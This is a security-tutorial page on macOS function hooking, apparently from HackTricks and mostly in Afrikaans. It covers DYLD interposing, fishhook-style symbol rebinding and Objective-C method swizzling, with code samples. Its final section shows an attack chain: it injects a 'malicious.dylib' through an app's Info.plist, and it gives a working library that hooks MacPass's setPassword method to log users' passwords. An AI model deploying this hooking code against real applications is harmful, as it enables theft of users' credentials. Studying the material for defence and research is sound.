# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Skep 'n **dylib** met 'n **`__interpose` (`__DATA___interpose`)**-afdeling (of 'n afdeling gemerk met **`S_INTERPOSING`**) wat tuple van **funksiewysers** bevat wat na die **oorspronklike** en die **vervangings** funksies verwys.

Dan, **inject** die dylib met **`DYLD_INSERT_LIBRARIES`** (die interposing moet plaasvind voordat die hoof-app laai). Uiteraard is die [**restrictions** wat op die gebruik van **`DYLD_INSERT_LIBRARIES`** toegepas word](macos-library-injection/index.html#check-restrictions) ook hier van toepassing.

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Die **`DYLD_PRINT_INTERPOSING`** env variable kan gebruik word om interposing te debug en sal die interpose-proses uitdruk.

Let ook daarop dat **interposing tussen die proses en die gelaaide libraries plaasvind**, dit werk nie met die shared library cache nie.

### Dynamic Interposing

Nou is dit ook moontlik om 'n funksie dinamies te interpose deur die funksie **`dyld_dynamic_interpose`** te gebruik. Dit laat toe om **programmaties** 'n funksie in **runtime** te interpose in plaas daarvan om dit net vanaf die **begin** te doen.

Dit is net nodig om die **tuples** van die **funksie om te vervang en die vervangings**funksie aan te dui.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

As jy reeds kode-uitvoering **binne die proses** het en ’n **geïmporteerde C-funksie** wil hook sonder om die teiken weer te begin, is ’n baie algemene primitive **symbol rebinding** (gewild gemaak deur **`fishhook`**).

In plaas daarvan om die **`__interpose`**-seksie te gebruik, loop hierdie tegniek deur die Mach-O metadata (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) en **oorskryf die import slot** wat deur die huidige image gebruik word. Dit is baie nuttig om funksies in ’n **reeds-lopende** proses te hook of om **net een image** met **`rebind_symbols_image`** te hook.

> [!TIP]
> Dit raak slegs calls wat werklik deur ’n **import pointer** gaan. As die teikenfunksie **direk binne dieselfde image** geroep word, is daar geen geïmporteerde slot om te oorskryf nie, so hierdie tegniek sal nie daardie call site sien nie.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Op onlangse macOS-weergawes is baie rebinding-teikens nie meer in skryfbare **`__DATA`**-bladsye nie. Rebinders moet gewoonlik **`__DATA_CONST`** tydelik skryfbaar maak voordat die wyser gepatch word. Boonop, op Apple Silicon / **`arm64e`** moet jy geverifieerde wyzers en ekstra indireksie in **`__AUTH_CONST.__auth_got`** verwag, so ’n rebinder wat net die klassieke lazy/non-lazy symbol pointer sections skandeer, kan sommige call sites mis.

> [!CAUTION]
> Die **`arm64e`** ABI gebruik **Pointer Authentication (PAC)** vir baie funksie-wysers. Blind pointer writes wat vroeër op Intel gewerk het, kan ’n call site op Apple Silicon breek. Wanneer jy jou eie rebinder of inline hooker skryf, wees gereed om **`<ptrauth.h>`** helpers soos **`ptrauth_sign_unauthenticated`** of **`ptrauth_auth_and_resign`** te gebruik en toets spesifiek op **`arm64e`** targets.

Vir meer besonderhede oor **`__AUTH`**, **`__AUTH_CONST`** en **`__auth_got`**, kyk [hierdie bladsy](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

In ObjectiveC is dit hoe ’n method aangeroep word: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Dit benodig die **object**, die **method** en die **params**. En wanneer ’n method aangeroep word, word ’n **msg gesend** met behulp van die **`objc_msgSend`**-function: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Die object is **`someObject`**, die method is **`@selector(method1p1:p2:)`** en die arguments is **`value1`**, **`value2`**.

Deur die object-strukture te volg, is dit moontlik om by ’n **array of methods** uit te kom waar die **names** en **pointers** na die method code **geplaas** is.

> [!CAUTION]
> Let daarop dat omdat methods en classes op grond van hulle names benader word, hierdie information in die binary gestoor word, so dit is moontlik om dit met `otool -ov </path/bin>` of [`class-dump </path/bin>`](https://github.com/nygard/class-dump) te herwin

### Accessing the raw methods

Dit is moontlik om toegang te kry tot die information van die methods soos name, aantal params of address soos in die volgende example:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Die funksie **`method_exchangeImplementations`** laat toe om die **adres** van die **implementering** van **een funksie met die ander een** te **verander**.

> [!CAUTION]
> So wanneer 'n funksie geroep word, is wat **uitgevoer word die ander een**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> In this case if the **implementasiekode van die legit** method **verifieer** die **method** **naam** it could **detect** this swizzling and prevent it from running.
>
> The following technique doesn't have this restriction.

### Method Swizzling with method_setImplementation

The previous format is weird because you are changing the implementation of 2 methods one from the other. Using the function **`method_setImplementation`** you can **change** the **implementation** of a **method for the other one**.

Just remember to **store the address of the implementation of the original one** if you are going to to call it from the new implementation before overwriting it because later it will be much complicated to locate that address.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Op hierdie bladsy is verskillende maniere bespreek om functions te hook. Maar, hulle het behels **om code binne die process te laat loop om aan te val**.

Om dit te doen is die maklikste technique om te gebruik om 'n [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) in te inject. Maar, ek dink dit kan ook gedoen word via [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Maar, albei options is **beperk** tot **unprotected** binaries/processes. Kyk na elke technique om meer te leer oor die limitations.

Maar, 'n function hooking attack is baie spesifiek, 'n attacker sal dit doen om **sensitive information van binne 'n process te steel** (as nie, sou jy net 'n process injection attack doen). En hierdie sensitive information mag geleë wees in user downloaded Apps soos MacPass.

So die attacker vector sou wees om óf 'n vulnerability te vind óf die signature van die application te strip, inject die **`DYLD_INSERT_LIBRARIES`** env variable deur die Info.plist van die application by te voeg iets soos:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
en dan **registreer** die toepassing weer:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Voeg in daardie biblioteek die hooking-kode by om die inligting uit te lek: Passwords, messages...

> [!CAUTION]
> Let daarop dat in nuwer weergawes van macOS, as jy die handtekening van die application binary **strip** en dit was voorheen uitgevoer, macOS **sal nie meer die application uitvoer** nie.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Verwysings

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
